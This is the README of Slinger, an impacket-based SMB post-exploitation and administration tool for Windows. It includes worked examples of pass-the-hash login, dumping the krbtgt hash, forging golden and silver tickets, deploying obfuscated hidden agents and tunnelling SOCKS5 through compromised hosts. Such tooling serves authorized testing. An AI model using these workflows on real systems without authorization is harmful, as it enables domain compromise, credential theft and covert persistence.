# Slinger

![Slinger](docs/assets/image.png)

Slinger is a versatile tool designed for advanced network interactions and manipulations, with a focus on the SMB protocol. It offers a range of functionalities for interacting with remote systems, including managing scheduled tasks, handling Windows Registry operations, service management and gathering system information - **all in a single session**.  Slinger is built on the impacket framework and should offer a similar feel to impacket functions.

## Key Features

### Core Capabilities
- **🔌 Structured SMB Client** - Object-oriented SMB operations with intelligent session management
- **♾️ Persistent Impacket Sessions** - Maintain connections across multiple operations without re-authenticating
- **⚡ Multiple Command Execution Methods** - ATExec (Task Scheduler), WMI DCOM, WMI over SMB pipes, and cooperative agents
- **🎯 User-Friendly Custom CLI** - Interactive shell with tab completion, command history, and intuitive syntax
- **📚 Verbose Help Documentation** - Comprehensive help system with `help --verbose` for categorized command reference
- **🔧 Consolidated Impacket Features** - Unified interface for SMB, RPC, WMI, registry, services, secrets dumping, and more
- **🧩 Extensible Plugin System** - Easy-to-develop plugins for custom functionality

### Windows Administration
- **Registry Management** - Query, create, modify, and delete registry keys and values remotely
- **Service Control** - Full lifecycle management of Windows services (create, start, stop, delete, configure)
- **Task Scheduling** - Manage scheduled tasks via Task Scheduler
- **Remote Process Lists** - Enumerate running processes with PID, PPID, priority, threads, and handles
- **System Enumeration** - Logged-on users, shares, disks, network interfaces, named pipes
- **Event Log Analysis** - Query and analyze Windows Event Logs
- **Secrets Dumping** - Extract credentials via SAM/SYSTEM hives and LSA secrets

### Advanced Features
- **Cooperative Agent System** - Polymorphic C++ agents with AES-256-GCM encryption over SMB named pipes
- **SOCKS5 Proxy Tunnel** - Route any tool through a compromised host via named pipe relay
- **Kerberos Authentication** - Golden/silver ticket forging, clock skew auto-fix, SPN enumeration
- **Secrets Dumping** - SAM/LSA/NTDS extraction with share-aware temp file paths
- **Resumable Downloads** - Large file transfers with automatic checkpoint recovery
- **Command Chaining** - Execute command sequences from scripts or inline with semicolon separation
- **Network Utilities** - Port forwarding rules, firewall enumeration, IP configuration

## Demo

[![asciicast](https://asciinema.org/a/nvpgBJ3lh6Z2xfg98jSFsOpvM.svg)](https://asciinema.org/a/nvpgBJ3lh6Z2xfg98jSFsOpvM)

## Command Line Documentation

[![CLI Documentation](docs/assets/clidocs.jpg)](docs/cli_menu.md)


## Usage

```bash
python3 slinger.py -h

      __,_____
     / __.==--"   SLINGER
    /#(-'             v1.18.0
    `-'                    a ghost-ng special

usage: slinger.py [-h] [--host HOST] [-u USERNAME] [--pass PASSWORD | --ntlm NTLM | --kerberos]
                  [-d DOMAIN] [-p PORT] [--timeout TIMEOUT] [--dc-ip IP]
                  [--sync-clock] [--nojoy] [--debug]
                  [--profile NAME] [--save-profile NAME] [--list-profiles]

impacket swiss army knife (sort of)

options:
  -h, --help            show this help message and exit
  --host HOST           Host to connect to (use hostname for Kerberos, IP for NTLM)
  -u, --user, --username USERNAME
                        Username for authentication
  -d, --domain DOMAIN   Domain for authentication (default: )
  -p, --port PORT       Port to connect to (default: 445)
  --timeout TIMEOUT     Global SMB connection timeout in seconds (default: 86400)
  --dc-ip IP            IP of the domain controller (KDC) for Kerberos authentication
  --sync-clock          Sync Kerberos timestamps with DC via NTP to fix clock skew
  --nojoy               Turn off emojis
  --verbose             Enable verbose output
  --debug               Turn on debug output
  --gen-ntlm-hash HASH  Generate NTLM hash from password
  -v, --version         Show version information

authentication (mutually exclusive):
  --pass, --password [PASSWORD]
                        Password for authentication
  --ntlm NTLM          NTLM hash for authentication
  --kerberos            Use Kerberos for authentication

connection profiles:
  --profile NAME        Load saved connection profile by name
  --save-profile NAME   Save connection as named profile after login
  --list-profiles       List saved connection profiles
```

Slinger offers multiple authentication methods. All methods are built on impacket functions and should therefore function the same.

### Login with password

```bash
python3 slinger.py --host 192.168.177.130 --user admin --pass admin

      __,_____
     / __.==--"   SLINGER
    /#(-'             v1.18.0
    `-'                    a ghost-ng special

[*] Connecting to 192.168.177.130:445...
[+] Successfully logged in to 192.168.177.130:445

Start Time: 2024-01-15 23:46:00.651408

[*] Checking the status of the RemoteRegistry service
[*] Service RemoteRegistry is in a stopped state
[*] Trying to start RemoteRegistry service
[+] Service RemoteRegistry is running
[+] Successfully logged in to 192.168.177.130:445
[sl] (192.168.177.130):\> exit
[*] Remote Registry state restored: RUNNING -> STOPPED
```

### Login with NTLM

```bash
python3 slinger.py --host 10.0.0.28 --user Administrator --ntlm :5E119EC7919CC3B1D7AD859697CFA659

      __,_____
     / __.==--"   SLINGER
    /#(-'             v1.18.0
    `-'                    a ghost-ng special

[*] Connecting to 10.0.0.28:445...
[+] Successfully logged in to 10.0.0.28:445

Start Time: 2024-01-15 23:42:15.410337

[*] Checking the status of the RemoteRegistry service
[*] Service RemoteRegistry is in a stopped state
[*] Trying to start RemoteRegistry service
[+] Service RemoteRegistry is running
[+] Successfully logged in to 10.0.0.28:445
[sl] (10.0.0.28):\> exit
[*] Remote Registry state restored: RUNNING -> STOPPED
```

### Login with profiles

```bash
# Save a profile after successful login
python3 slinger.py --host 10.0.0.28 --user Administrator --ntlm :hash --save-profile lab

# Connect using saved profile (credentials included)
python3 slinger.py --profile lab

# List saved profiles
python3 slinger.py --list-profiles
[*] Saved profiles (1):
  lab: Administrator@10.0.0.28:445 (ntlm, hash saved)
```

Profiles are stored in `~/.slinger/profiles/` with `chmod 600` permissions. Credentials (NTLM hash, password) are saved in the profile so you can reconnect with just `--profile <name>`. Command-line auth flags override stored credentials.

### Login with Kerberos

Kerberos authentication uses a ccache ticket file instead of a password or hash. Slinger can forge golden/silver tickets from within a session using dumped credentials.

**Full workflow: dump hashes, forge ticket, authenticate with Kerberos**

```bash
# Step 1: Login with NTLM and dump the krbtgt hash
python3 slinger.py --host 10.10.0.100 --user Administrator --ntlm :hash --domain CORP

[sl] (10.10.0.100):\> use C$
[+] Connected to share C$
[sl] (10.10.0.100):\C$> secretsdump --ntds --just-dc-ntlm
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
[+] Extracted 33 secret(s)

# Step 2: Forge a golden ticket (auto-fetches domain SID)
[sl] (10.10.0.100):\C$> ticket golden --nthash 819af826bb148e603acb0f33d17632f8 --domain corp.local
[+] Domain SID: S-1-5-21-3072663084-364016917-1341370565
[+] Golden ticket saved to /home/user/.slinger/Administrator.ccache
[*] Use with: export KRB5CCNAME=/home/user/.slinger/Administrator.ccache

# Step 3: Login with the forged ticket
export KRB5CCNAME=/home/user/.slinger/Administrator.ccache
python3 slinger.py --host DC01.corp.local --domain corp.local --kerberos --dc-ip 10.10.0.100
[*] Connecting to 10.10.0.100:445...
[+] Successfully logged in to DC01.corp.local:445
```

**Key flags for Kerberos:**

| Flag | Purpose |
|------|---------|
| `--kerberos` | Use Kerberos authentication (reads `KRB5CCNAME` for ticket) |
| `--host` | Target hostname — must match the SPN in Active Directory (e.g., `DC01.corp.local`) |
| `--dc-ip` | IP address of the domain controller — used for TCP connection and KDC communication |
| `--domain` | Domain FQDN (e.g., `corp.local`) |
| `--sync-clock` | Query DC time via NTP and adjust Kerberos timestamps to fix clock skew |

**Clock skew:** Kerberos rejects timestamps more than 5 minutes off from the server. Use `--sync-clock` to automatically compensate without changing your system clock.

**Silver tickets** target a specific service (e.g., CIFS) using a machine/service account hash:

```bash
# Forge a silver ticket for CIFS access
[sl] (10.10.0.100):\C$> ticket silver --nthash <machine_hash> --spn cifs/DC01.corp.local --domain corp.local
[+] Silver ticket saved to /home/user/.slinger/Administrator.ccache
```

### Available Commands

```bash
Available commands (116):
------------------------------------------
!                     enumtransport         regcheck              showservice
#shell                env                   regcreate             showtask
agent                 eventlog              regdel                svcadd
atexec                exit                  regquery              svccreate
cat                   find                  regset                svcdelete
cd                    fwrules               regstart              svcdisable
changes               get                   regstop               svcenable
clear                 hashdump              reguse                svcenum
config                help                  reload                svcshow
debug-availcounters   history               rm                    svcstart
debug-counter         hostname              rmdir                 svcstop
disableservice        ifconfig              run                   taskadd
disablesvc            info                  secretsdump           taskcreate
download              ipconfig              servertime            taskdel
downloads             logoff                serviceadd            taskdelete
enableservice         logout                servicecreate         taskenum
enablesvc             ls                    servicedel            taskexec
enumdisk              mget                  servicedelete         taskimport
enuminfo              mkdir                 servicedisable        tasklist
enuminterfaces        network               serviceenable         taskrm
enumlogons            plugins               servicerun            taskrun
enumpipes             portfwd               services              tasksenum
enumservices          procs                 servicesenum          taskshow
enumshares            ps                    serviceshow           tasksshow
enumsys               put                   servicestart          time
enumtasks             pwd                   servicestop           upload
enumtime              quit                  set                   use
                      reconnect             shares                who
                                            wmiexec
                      quit                  set                   use
                      reconnect             shares                who
                      regcheck              showservice           wmiexec

Type help <command> or <command> -h for more information on a specific command
Type help --verbose for detailed categorized help
```

#### Click here to view all the help entries:
[Help Entries](docs/cli_menu.md)


### Command Chaining
Slinger has two ways to execute a sequence of commands.

- Run a command chain through the CLI:
    run -c "cmd1;cmd2;cmd3"
- Run a series of commands from a script file, one command per line
    cmd1
    cmd2
    cmd3

```bash
run --help
usage: slinger run [-h] (-c CMD_CHAIN | -f FILE)

Run a slinger script or command sequence

options:
  -h, --help            show this help message and exit
  -c, --cmd-chain CMD_CHAIN
                        Specify a command sequence to run
  -f, --file FILE       Specify a script file to run

Example Usage: run -c "cmd1;cmd2;cmd3" | run -f script.txt
```


## System Change Audit Trail

Every operation that touches the remote target is automatically tracked — file uploads, service changes, task creation, registry edits, command execution, temp file artifacts, and process launches. The audit trail captures what was done, when, and how, giving full accountability for every session.

**What gets tracked:**

| Category | Examples |
|----------|----------|
| `FILE` | uploads, downloads, deletes, temp files (created+deleted) |
| `EXEC` | wmiexec, atexec, proxy_start, proxy_stop, secretsdump |
| `TASK` | scheduled task create/delete via atexec |
| `SERVICE` | RemoteRegistry start/restore during secretsdump |
| `REGISTRY` | key/value creates, modifies, deletes |

```bash
# View all changes
changes

# Example: full proxy lifecycle audit
+----------+------------+------------------+--------------------------------------------+------------------------------------------+
| Time     | Category   | Action           | Target                                     | Details                                  |
+==========+============+==================+============================================+==========================================+
| 18:56:06 | FILE       | upload           | C$\Users\Public\Downloads\socksproxy.exe   | from ~/.slinger/proxies/svcproxy_abc.exe |
| 18:56:06 | FILE       | proxy_deploy     | C$\Users\Public\Downloads\socksproxy.exe   | socksproxy                               |
| 18:56:06 | EXEC       | wmiexec_dcom     | "C:\Users\Public\Downloads\socksproxy.exe" | PID=7132                                 |
| 18:56:06 | EXEC       | proxy_start      | socksproxy                                 | method=wmiexec                           |
| 18:57:37 | EXEC       | proxy_connect    | socksproxy                                 | socks5://127.0.0.1:1080                  |
| 18:59:33 | EXEC       | proxy_disconnect | socksproxy                                 |                                          |
| 18:59:33 | EXEC       | wmiexec_dcom     | taskkill /F /IM socksproxy.exe             | PID=8072                                 |
| 18:59:33 | FILE       | wmiexec_dcom     | C:\Windows\Temp\MkpVmY.txt                 | temp output (created+deleted)            |
| 18:59:34 | FILE       | delete           | C$\\Windows\Temp\MkpVmY.txt                |                                          |
| 18:59:34 | EXEC       | proxy_stop       | socksproxy                                 | method=wmiexec                           |
+----------+------------+------------------+--------------------------------------------+------------------------------------------+
Total: 10 change(s) (4 file, 6 exec)

# Filter and export
changes --category FILE          # Show only file operations
changes --category EXEC          # Show only command executions
changes --save                   # Export to JSON
changes --clear                  # Reset for next phase
```

On session exit, the change summary is automatically printed and saved to `~/.slinger/logs/changes/`.

### Adding Change Tracking to New Features

Any new command that modifies the remote target needs one line after its success path:
```python
self._track("CATEGORY", "action", target, "optional details")
```
Categories: `FILE`, `SERVICE`, `TASK`, `REGISTRY`, `AGENT`, `EXEC` (or any custom string).

## Plugins

**System Audit** by [ghost-ng](https://github.com/ghost-ng/)

## Installation

### Development Installation
```bash
git clone https://github.com/ghost-ng/slinger.git
cd slinger
pipx install .
```

### Agent Build Dependencies

To build cooperative agents, install the following dependencies:

**Required:**
- CMake 3.15+
- MinGW-w64 cross-compiler (`x86_64-w64-mingw32-g++`, `i686-w64-mingw32-g++`)

**Automated Installation (Linux/macOS):**
```bash
python scripts/install_agent_deps.py
```

**Manual Installation:**

*Ubuntu/Debian:*
```bash
sudo apt update && sudo apt install cmake build-essential mingw-w64
```

*CentOS/RHEL:*
```bash
sudo yum groupinstall "Development Tools" && sudo yum install cmake mingw64-gcc-c++
```

*Fedora:*
```bash
sudo dnf groupinstall "Development Tools" && sudo dnf install cmake mingw64-gcc-c++
```

*macOS:*
```bash
brew install cmake mingw-w64
```

## Cooperative Agent System

Polymorphic C++ agent for encrypted command execution over SMB named pipes. No new ports opened — all traffic flows over TCP 445.

- **Polymorphic builds** — unique binary per build (compile-time string XOR, function name mangling, control flow obfuscation)
- **AES-256-GCM encryption** — HMAC-SHA256 challenge-response auth with PBKDF2 key derivation
- **GUI subsystem binary** — no console window on target (`-mwindows`, `ShowWindow=0`)
- **Cross-architecture** — x86/x64 Windows targets via MinGW cross-compilation
- **Full lifecycle** — build, deploy, start, use, check, kill, remove

```bash
# Build with authentication + obfuscation
agent build --arch x64 --pass MySecretPass --obfuscate

# Deploy to target and start
use C$
agent deploy ~/.slinger/agents/agent_x64.exe --name updater --start

# Connect and execute commands over encrypted named pipe
agent use updater
[+] Authentication successful - all communications encrypted
## agent:updater ## C:\> whoami
nt authority\system
## agent:updater ## C:\> exit

# Manage
agent list                     # Show all deployed agents
agent check updater            # Check if process is running
agent kill updater             # Kill agent process
agent start updater            # Restart (wmiexec or --method atexec)
agent rm updater               # Delete file from target
```

## SOCKS5 Proxy Tunnel

Lightweight SOCKS5 proxy binary that tunnels traffic through SMB named pipes. Deploy to a compromised host and route any tool through it — no new ports opened on the target.

- **Named pipe transport** — all tunnel traffic rides the existing SMB session (TCP 445)
- **Multiplexed channels** — multiple concurrent SOCKS connections over a single pipe
- **Same obfuscation as agent** — polymorphic builds, string XOR, GUI subsystem, no console
- **Encrypted auth** — optional passphrase with HMAC-SHA256 + PBKDF2 (same as agent)
- **Reconnectable** — proxy stays alive between client sessions, `back` to background, `use` to re-enter
- **Full audit trail** — all operations tracked in `changes`

```bash
# Build proxy binary
proxy build --arch x64 --pipe myproxy --pass s3cret --obfuscate

# Deploy and start on target
use C$
proxy deploy ~/.slinger/proxies/svcproxy_abc.exe --name myproxy --start

# Connect — starts local SOCKS5 listener
proxy connect myproxy
[+] Connected to proxy
[+] Authentication successful
[+] SOCKS5 proxy listening on 127.0.0.1:1080

# Use from another terminal with proxychains
proxychains nmap -sT -Pn 10.10.10.0/24 -p 445
proxychains crackmapexec smb 10.10.10.5

# Or tunnel another slinger session through the proxy
proxychains python slinger.py --profile lab --host 127.0.0.1
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
[+] Successfully logged in to 127.0.0.1:445

# Proxy subshell commands
proxy> status                  # Active tunnel count
proxy> back                    # Background (proxy keeps running)
proxy> stop                    # Shutdown + kill remote process

# Manage from main shell
proxy use myproxy              # Re-enter subshell
proxy start myproxy            # Start deployed proxy
proxy stop myproxy             # Kill remote process
proxy rm myproxy               # Delete file from target
proxy list                     # Show deployed proxies
```

## TODO

- see TODO.md

## Contributing

### Creating Your Own Plugin for Slinger

Contributions to the Slinger project, particularly in the form of plugins, are highly appreciated. If you're interested in developing a plugin, here's a guide to help you get started:

#### 1. Set Up Your Development Environment

- Fork the [Slinger repository](https://github.com/ghost-ng/slinger) and clone it to your local machine.
- Set up a Python development environment and install any necessary dependencies.

#### 2. Create a New Plugin

- Go to the `slinger/plugins` directory in your local repository.
- Create a new Python file for your plugin, e.g., `my_plugin.py`.
- Begin by importing the required modules, including the base plugin class:

  ```python
  from slinger.lib.plugin_base import PluginBase
  ```

#### 3. Develop Your Plugin

- Your plugin class should inherit from `PluginBase`.
- Implement the `get_parser` method to define the command-line interface for your plugin:

  ```python
  class MyPlugin(PluginBase):   <--required
      def get_parser(self):   <--required
        parser = argparse.ArgumentParser(add_help=False)   <--required
        subparsers = parser.add_subparsers(dest='command')   <--required
        plugincmd_parser = subparsers.add_parser("plugincmd", help="My plugin subparser")   <--required
        plugincmd_parser.add_argument("--plugincmd", help="My plugin argument")
        plugincmd_parser.set_defaults(func=self.run)   <--required
        return parser   <--required
  ```

- The `run` method can be used as an entry point for your plugin's functionality. It should be defined to handle the plugin's core logic.  Whatever the function name, it should be the same name as the function you added in the parser's "set_defaults" and it should accept "args" as a function parameter.

  ```python
  def run(self, args):
      # Your plugin's core functionality goes here
  ```

- Add any additional methods or attributes necessary for your plugin.
- **View the example plugin for additional help** [System Audit](src/slingerpkg/plugins/system_audit.py)

#### 4. Test Your Plugin

- Place your plugin in the ~/.slinger/plugin directory Thoroughly test your plugin to ensure it functions correctly and integrates seamlessly with Slinger.
- Ensure your plugin adheres to the coding standards and conventions of the project.

#### 5. Document Your Plugin

- Provide clear documentation for your plugin, detailing its purpose, usage, and any other important information.
- Update the `README.md` or other relevant documentation to include your plugin's details.

#### 6. Submit a Pull Request

- Once your plugin is complete and tested, push your changes to your fork and create a pull request to the main Slinger repository.
- Describe your plugin's functionality and any other pertinent details in your pull request.

### General Guidelines

- Write clean, well-documented code that follows the project's style guidelines.
- If applicable, write tests for your code.
- Keep pull requests focused – one feature or fix per request is ideal.

## Disclaimer

Please note that this software is provided as-is, and while we strive to ensure its quality and reliability, we cannot guarantee its performance under all circumstances. The authors and contributors are not responsible for any damage, data loss, or other issues that may occur as a result of using this software. Always ensure you have a backup of your data and use this software at your own risk.

Any likeness to other software, either real or fictitious, is purely coincidental unless otherwise stated. This software, unless otherwise stated, is unique and developed independently, and any similarities are not intended to infringe on any rights of the owners of similar software.
